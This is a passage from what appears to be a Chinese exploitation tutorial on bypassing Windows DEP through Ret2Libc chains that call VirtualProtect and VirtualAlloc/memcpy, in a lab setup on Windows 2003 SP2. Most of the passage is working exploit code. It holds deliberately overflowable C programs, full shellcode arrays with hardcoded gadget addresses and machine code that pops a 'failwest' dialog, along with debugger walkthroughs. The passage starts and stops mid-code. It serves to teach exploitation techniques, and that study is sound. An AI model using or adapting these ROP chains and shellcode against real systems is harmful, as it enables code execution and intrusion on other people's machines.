&quot;……&quot; &quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot; ;void test()&#123; char str[176]; memcpy(str,shellcode,420);&#125;int main()&#123; HINSTANCE hInst = LoadLibrary(&quot;shell32.dll&quot;); char temp[200]; test(); return 0;&#125; 实验思路： （ 1）为了更直观地反映绕过 DEP 的过程，我们在本次实验中不启用 GS 和 SafeSEH。 （ 2）函数 test 中通过向 str 复制超长字符串造成 str 溢出，进而覆盖函数返回地址。 （ 3）覆盖掉函数返回地址后，通过 Ret2Libc 技术，利用 VirtualProtect 函数将 shellcode 所在内存区域设置为可执行模式。 （ 4）通过 push esp jmp eax 指令序列动态设置 VirtualProtect 函数中的 shellcode 所在内存起始地址以及内存原始属性类型保存地址。 （ 5）内存区域被设置成可执行模式后 shellcode 就可以正常执行了。 推荐使用的环境 备 注 操作系统 Windows 2003 SP2 DEP 状态 Optout 编译器 VC++ 6.0 编译选项 禁用优化选项 build 版本 release 版本 实验步骤： （ 1）由于溢出时，EBP被覆盖破坏，先修复 EBP（把 ESP赋值给 EBP） 用 PUSH ESP POP EBP RETN 4 指令的地址（0x77ECE353）覆盖 test 函数的返回地址。 123456789101112131415char shellcode[]= &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x53\\xe3\\xec\\x77&quot; //修正 EBP 77ECE353; retn 4 返回到 0x0012FE70（ebp+0x8） 处存储的地址（0x00000000）执行，如下图所示 （ 2）利用 VirtualProtect 函数将 shellcode 所在内存区域设置为可执行模式 修改属性的内存地址（ebp+0x8）设置为当前堆栈中的某个地址 现在我们的目标是动态覆盖掉 ebp+0x14，ebp+0x8，而要保证 ebp+0x10，ebp+0xC不变（由上面的分析可知，ebp+0x10，ebp+0xC 是两个固定参数）。 现在 ESP 刚好指向 EBP+8 的位置，如果此时我们能找到类似 MOV [EBP],** POP ** POP ** POP ** RETN 或者 MOV [EBP],** JMP **的指令就可以将要修改属性的内存地址设置为当前堆栈中的某个地址了。但是我们并没有找到这样的指令，我们不妨让 ESP 向下移动 4 个字节，然后执行一条 PUSH ESP RETN/JMP EAX 指令也能达到目的。那么什么样的指令能让 ESP 向高址方向移动 4字节，而不影响程序的控制？RETN指令，既能让 esp+4 又能收回程序控制权 123456789101112131415161718char shellcode[]= &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x53\\xe3\\xec\\x77&quot; //修正 EBP 77ECE353 &quot;\\x8B\\x17\\x84\\x7C&quot;//RETN &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xBF\\x7D\\xC9\\x77&quot;//push esp jmp eax; 运行调试。在 0x7CBBD9BA（调整EBP 入口）处下断点。运行到 JMP EAX 时暂停程序，观察当前内存状态。如下图所示，已经成功将 EBP+0x8 写为当前堆栈中的地址。 保证 EBP+0x14 处存放的地址为可写地址 让 ESP 指向 EBP+0x18，再用 PUSH ESP JMP EAX 指令来设置 EBP+0x14 的参数。 （1）观察堆栈，此时 ESP=0x0012FE70，EBP+0x14=0x0012FE7C，只需让 ESP 向高址方向移动 16 个字节，就能让 ESP 指向 EBP+0x18（=0x0012FE80）。使用类似 POP POP POP RETN指令（注意：不能修改 ESP、EBP、EAX）选用 0x7CBF1A0A 处的 POP ESI POP EBX POP EDI RETN 指令。 （2）用 PUSH ESP JMP EAX 指令设置 EBP+0x14 的参数。先要重新获得程序控制权，当前正在执行 jmp eax，所以要先使用 POP EAX RETN 指令地址覆盖 test() 返回地址，来将 0x7CBF1A0A 赋值给 EAX，才能执行 POP POP POP RETN指令。 （3）确定那两个固定参数，shellcode大小 0xff 就足够弹框代码用了，那个常量就用0x40。 12345678910111213141516171819202122char shellcode[]= &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x8A\\x17\\x84\\x7C&quot;//pop eax retn &quot;\\x0A\\x1A\\xBF\\x7C&quot;//pop pop pop retn &quot;\\xBA\\xD9\\xBB\\x7C&quot;//修正 EBP &quot;\\x8B\\x17\\x84\\x7C&quot;//RETN &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xBF\\x7D\\xC9\\x77&quot;//push esp jmp eax &quot;\\xFF\\x00\\x00\\x00&quot;//要修改的内存大小 &quot;\\x40\\x00\\x00\\x00&quot;//可读可写可执行属性代码; 总结一下刚才的过程： 1.首先通过pop eax ret将pop pop pop ret的地址保存到eax。 2.修正ebp，由于是retn 4，所以要加4个字节的90填充。 3.执行push esp，jmp eax，此时通过ebp索引的参数值已经可以对上号了，除了那个可写的地址。 （4）接下来要把 ESP 写入到 EBP+0x14 处。用 push esp jmp eax 来把 EBP+0x14 写为可写入地址。然后在执行完 pop pop pop retn 后返回到 virtualProtect() 来把 Shellcode 设置为可执行页。 12345678910111213141516171819202122232425char shellcode[]= &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x8A\\x17\\x84\\x7C&quot;//pop eax retn &quot;\\x0A\\x1A\\xBF\\x7C&quot;//pop pop pop retn &quot;\\xBA\\xD9\\xBB\\x7C&quot;//修正 EBP &quot;\\x8B\\x17\\x84\\x7C&quot;//RETN &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xBF\\x7D\\xC9\\x77&quot;//push esp jmp eax &quot;\\xFF\\x00\\x00\\x00&quot;//要修改的内存大小 &quot;\\x40\\x00\\x00\\x00&quot;//可读可写可执行属性代码 &quot;\\xBF\\x7D\\xC9\\x77&quot;//push esp jmp eax &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xE8\\x1F\\x80\\x7C&quot;//修改内存属性 如下图所示，EAX 的值为 1， 根据 MSDN 的介绍说明我们已经成功修改了内存属性。 （ 3）跳转到 shellcode 执行 接下来的布置工作很简单，在位置 0X12FE98 放置 JMP ESP 指令，并在 RETN 0x10 后 ESP 指向的位置（0x0012FEAC）开始放置弹出对话框的机器码，实现 exploit。 按下图布置 shellcode： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;stdio.h&gt;#include&lt;windows.h&gt;char shellcode[]= &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; //&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x8A\\x17\\x84\\x7C&quot;//pop eax retn &quot;\\x0A\\x1A\\xBF\\x7C&quot;//pop pop pop retn &quot;\\xBA\\xD9\\xBB\\x7C&quot;//修正 EBP ,push esp pop ebp retn &quot;\\x8B\\x17\\x84\\x7C&quot;//RETN &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xBF\\x7D\\xC9\\x77&quot;//push esp jmp eax &quot;\\xFF\\x00\\x00\\x00&quot;//要修改的内存大小 &quot;\\x40\\x00\\x00\\x00&quot;//可读可写可执行属性代码 &quot;\\xBF\\x7D\\xC9\\x77&quot;//push esp jmp eax &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xE8\\x1F\\x80\\x7C&quot;//修改内存属性 &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xA4\\xDE\\xA2\\x7C&quot;//jmp esp &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; &quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot; &quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot; &quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot; &quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot; &quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot; &quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot; &quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot; &quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot; &quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot; &quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot; ;void test()&#123; char str[176]; memcpy(str,shellcode,420);&#125;int main()&#123; HINSTANCE hInst = LoadLibrary(&quot;shell32.dll&quot;); char temp[200]; test(); return 0;&#125; 运行程序，弹出 “failwest” 对话框，攻击成功，如下图。 Ret2Libc 实战之利用 VirtualAlloc 除了修改属性外，我们还可以通过 kernel32.dll 中的 VirtualAlloc 函数来申请一段具有可执行属性的内存。 我们就可以将 Ret2Libc 的第一跳设置为 VirtualAlloc 函数地址，然后将shellcode 复制到申请的内存空间里，以绕过 DEP 的限制。 123456LPVOID WINAPI VirtualAlloc( __in_opt LPVOID lpAddress, //申请内存区域的地址，如果这个参数是 NULL，系统将会决定分配内存区域的位置，并且按 64KB 向上取整。 __in SIZE_T dwSize, //申请内存区域的大小。 __in DWORD flAllocationType, //申请内存区域的大小。 __in DWORD flProtect //申请内存的访问控制类型，如读、写、执行等权限。);//内存申请成功时函数返回申请内存的起始地址，申请失败时返回 NULL。 安照如下参数布置函数，来申请可执行的空间。 VirtualAlloc(0x0030000, 0xFF, 0x00001000, 0x00000040) （ 1） lpAddress=0x00030000，只要选择一个未被占用的地址即可，没有什么特殊要求。 （ 2） dwSize=0xFF，申请空间的大小可以根据 shellcode 的长度确定，本次实验申请 255 个字节，足够 shellcode 使用。 （ 3） flAllocationType=0x00001000，该值使用 0x00001000 即可， 如有特殊需要可根据 MSDN的介绍来设置为其他值。 （ 4） flProtect=0x00000040，内存属性要设置为可读可写可执行，根据 MSDN 介绍，该属性对应的代码为 0x00000040。 实验代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;stdio.h&gt;#include&lt;windows.h&gt;char shellcode[]= &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;……&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xBA\\xD9\\xBB\\x7C&quot;//修正 EBP retn 4 &quot;\\xBC\\x45\\x82\\x7C&quot;//申请空间 &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xFF\\xFF\\xFF\\xFF&quot;//-1 当前进程 &quot;\\x00\\x00\\x03\\x00&quot;//申请空间起始地址 &quot;\\xFF\\x00\\x00\\x00&quot;//申请空间大小 &quot;\\x00\\x10\\x00\\x00&quot;//申请类型 &quot;\\x40\\x00\\x00\\x00&quot;//申请空间访问类型 &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x8A\\x17\\x84\\x7C&quot;//pop eax retn &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x0B\\x1A\\xBF\\x7C&quot;//pop pop retn &quot;\\xBA\\xD9\\xBB\\x7C&quot;//修正 EBP retn4 &quot;\\x5F\\x78\\xA6\\x7C&quot;//pop retn &quot;\\x00\\x00\\x03\\x00&quot;//可执行内存空间地址，转入执行用 &quot;\\x00\\x00\\x03\\x00&quot;//可执行内存空间地址，复制用 &quot;\\xBF\\x7D\\xC9\\x77&quot;//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址 &quot;\\xFF\\x00\\x00\\x00&quot;//shellcode 长度 &quot;\\xAC\\xAF\\x94\\x7C&quot;//memcpy &quot;\\x00\\x00\\x03\\x00&quot;//一个可以读地址 &quot;\\x00\\x00\\x03\\x00&quot;//一个可以读地址 &quot;\\x00\\x90\\x90\\x94&quot; &quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; &quot;……&quot; &quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot;;void test()&#123; chartt[176]; memcpy(tt,shellcode,450);&#125;int main()&#123; HINSTANCEhInst = LoadLibrary(&quot;shell32.dll&quot;); chartemp[200]; test(); return 0;&#125; 实验思路： （ 1）为了更直观地反映绕过 DEP 的过程，我们在本次实验中不启用 GS 和 SafeSEH。 （ 2）函数 test 中通过向 str 复制超长字符串造成 str 溢出，进而覆盖函 数返回地址。 （ 3）覆盖掉函数返回地址后，通过 Ret2Libc 技术，利用 VirtualAlloc 函数申请一段具有执行权限的内存。 （ 4）通过 memcpy 函数将 shellcode 复制到 VirtualAlloc 函数申请的可执行内存空间中。 （ 5）最后在这段可执行的内存空间中执行 shellcode，实现 DEP 的绕过。 推荐使用的环境 备 注 操作系统 Windows 2003 SP2 DEP 状态 Optout 编译器 VC++ 6.0 编译选项 禁用优化选项 build 版本 release 版本 实验步骤： （ 1）先修复 EBP（把 ESP赋值给 EBP），并布置参数 用 PUSH ESP POP EBP RETN 4 指令的地址覆盖 test 函数的返回地址，然后按照以上参数布置一个能够申请可执行内存空间的 shellcode。 12345678910111213char shellcode[]= &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;……&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xBA\\xD9\\xBB\\x7C&quot;//修正 EBP retn 4 &quot;\\xBC\\x45\\x82\\x7C&quot;//CALL VirtualAllocEx 地址 &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xFF\\xFF\\xFF\\xFF&quot;//-1 当前进程 &quot;\\x00\\x00\\x03\\x00&quot;//申请空间起始地址 0x00030000 &quot;\\xFF\\x00\\x00\\x00&quot;//申请空间大小 0xFF &quot;\\x00\\x10\\x00\\x00&quot;//申请类型 0x1000 &quot;\\x40\\x00\\x00\\x00&quot;//申请空间访问类型 0x40 ; 调试程序，在 0x7CBBD9BA（调整 EBP 入口）处下断点，然后按 F8 键单步运行到 0x7C8245C2（ VirtualAlloc 函数的 RETN 0x10）暂停，观察内存状态。EAX 中是我们申请空间的起始地址0x00030000，说明我们的空间申请成功了，此时通过 OllyDbg 的内存窗口也可以看到我们刚刚申请的空间，而且属性是带 E 的标志！ （ 2）把 shellcode 复制到刚申请的内存空间中 用位于 ntdll.dll 中的 memcpy 函数进行复制，它需要三个参数，依次为目的内存起始地址、源内存起始地址、复制长度，其中目的内存起始地址和复制长度都可以直接写在 shellcode 中，唯一的难点在于对源内存起始地址的确定。 实际上我们不需要精确的定位，只要保证源内存起始地址在 shellcode 中关键代码的前边即可，因此可以使用 PUSH ESP JMP EAX 指令来填充这个参数。 另外一个需要注意的问题，在空间申请后 EBP 被设置成 0x00000000，而后边我们还会再用到 EBP，所以还需要修复 EBP。 最后还需要注意 VirtualAlloc 函数返回时带有 16（ 0x10）个字节的偏移，要在 shellcode 中要添加相应的填充。 12345678910111213141516171819202122char shellcode[]= &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;……&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xBA\\xD9\\xBB\\x7C&quot;//修正 EBP retn 4 &quot;\\xBC\\x45\\x82\\x7C&quot;//CALL VirtualAllocEx 地址 &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xFF\\xFF\\xFF\\xFF&quot;//-1 当前进程 &quot;\\x00\\x00\\x03\\x00&quot;//申请空间起始地址 0x00030000 &quot;\\xFF\\x00\\x00\\x00&quot;//申请空间大小 0xFF &quot;\\x00\\x10\\x00\\x00&quot;//申请类型 0x1000 &quot;\\x40\\x00\\x00\\x00&quot;//申请空间访问类型 0x40 &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x8A\\x17\\x84\\x7C&quot;//pop eax retn &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90&quot;//EAX 指向的指令暂时先用\\x90 填充 &quot;\\xBA\\xD9\\xBB\\x7C&quot;//修正 EBP ; 运行调试，在第二次修复 EBP 的 retn 4 处暂停，此时 EBP=ESP=0x0012FEA4，而 memcpy 中的源内存地址参数位于 EBP+0x0C（0x0012FEB0），如果我们要使用 PUSH ESP 的方式设置源内存地址，就需要让 ESP 指向 EBP+0x10（0x0012FEB4），这样执行完 PUSH 操作后 ESP 的值刚好放在 EBP+0x0C。为了达到这个目的有两个问题需要解决： ESP 如何指向 EBP+0x10 和 PUSH ESP 操作后程序控制权如何回收。 先来解决第一个问题。当执行完 retn 4 后，ESP 指向 EBP+0x8 位置，现在要想 ESP 指向 EBP+0x10 就只需要再执行一条 pop retn 指令。在当前 EBP 的位置放置 POP ECX RETN（地址为 0x7CA6785F）。 再来解决第二个问题。在执行完 PUSH 操作后收回程序控制权的最佳位置在 EBP+0x14，因为在这个位置执行 RETN 指令既保证了 memcpy 参数不被破坏，又可以减小 shellcode 长度。故在执行完 PUSH 操作后我们只需要 POP 两次就可以让 ESP 指向 EBP+0x14，所以 JMP EAX指令中的 EAX 只要指向类似 POP POP RETN 指令即可。然后在 EBP+0x14 位置放置 memcpy函数的切入点 0x7C94AFAC（ MOV ESI,DWORD PTR SS:[EBP+C]），这样程序在执行类似 POP POP RETN 指令中 RETN 时就可以转入 memcpy 函数中执行复制操作了。 123456789101112131415161718192021222324char shellcode[]= &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;……&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xBA\\xD9\\xBB\\x7C&quot;//修正 EBP retn 4 &quot;\\xBC\\x45\\x82\\x7C&quot;//CALL VirtualAllocEx 地址 &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xFF\\xFF\\xFF\\xFF&quot;//-1 当前进程 &quot;\\x00\\x00\\x03\\x00&quot;//申请空间起始地址 0x00030000 &quot;\\xFF\\x00\\x00\\x00&quot;//申请空间大小 0xFF &quot;\\x00\\x10\\x00\\x00&quot;//申请类型 0x1000 &quot;\\x40\\x00\\x00\\x00&quot;//申请空间访问类型 0x40 &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x8A\\x17\\x84\\x7C&quot;//pop eax retn &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x0B\\x1A\\xBF\\x7C&quot;//pop pop retn &quot;\\xBA\\xD9\\xBB\\x7C&quot;//修正 EBP retn4 &quot;\\x5F\\x78\\xA6\\x7C&quot;//pop retn &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x00\\x00\\x03\\x00&quot;//可执行内存空间地址 &quot;\\xBF\\x7D\\xC9\\x77&quot;//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址 &quot;\\xFF\\x00\\x00\\x00&quot;//shellcode 长度 &quot;\\xAC\\xAF\\x94\\x7C&quot;//memcpy 函数切入点; ; 运行调试，在 memcpy 函数复制结束返回前暂停，此时 ESP=0x0012FEA8，位于 shellcode 中，并且这里只是放置了填充符。它位于 pop pop retn 指令地址和 memcpy 参数之间，并且紧挨着 memcpy 第一个参数。 接下来，只要在这个位置（0x0012FEA8）填上申请的可执行内存空间起始地址（0x00030000），就能转入该区域执行。 由上图可知，复制的源内存地址为 0x0012FEB4，就是 memcpy 函数的复制长度参数所在位置，所以只要在它后面接弹出对话框的机器码就行了。 1234567891011121314151617181920212223242526272829303132333435char shellcode[]= &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;……&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xBA\\xD9\\xBB\\x7C&quot;//修正 EBP retn 4 &quot;\\xBC\\x45\\x82\\x7C&quot;//CALL VirtualAllocEx 地址 &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\xFF\\xFF\\xFF\\xFF&quot;//-1 当前进程 &quot;\\x00\\x00\\x03\\x00&quot;//申请空间起始地址 0x00030000 &quot;\\xFF\\x00\\x00\\x00&quot;//申请空间大小 0xFF &quot;\\x00\\x10\\x00\\x00&quot;//申请类型 0x1000 &quot;\\x40\\x00\\x00\\x00&quot;//申请空间访问类型 0x40 &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x8A\\x17\\x84\\x7C&quot;//pop eax retn &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x0B\\x1A\\xBF\\x7C&quot;//pop pop retn &quot;\\xBA\\xD9\\xBB\\x7C&quot;//修正 EBP retn4 &quot;\\x5F\\x78\\xA6\\x7C&quot;//pop retn &quot;\\x00\\x00\\x03\\x00&quot; &quot;\\x00\\x00\\x03\\x00&quot;//可执行内存空间地址 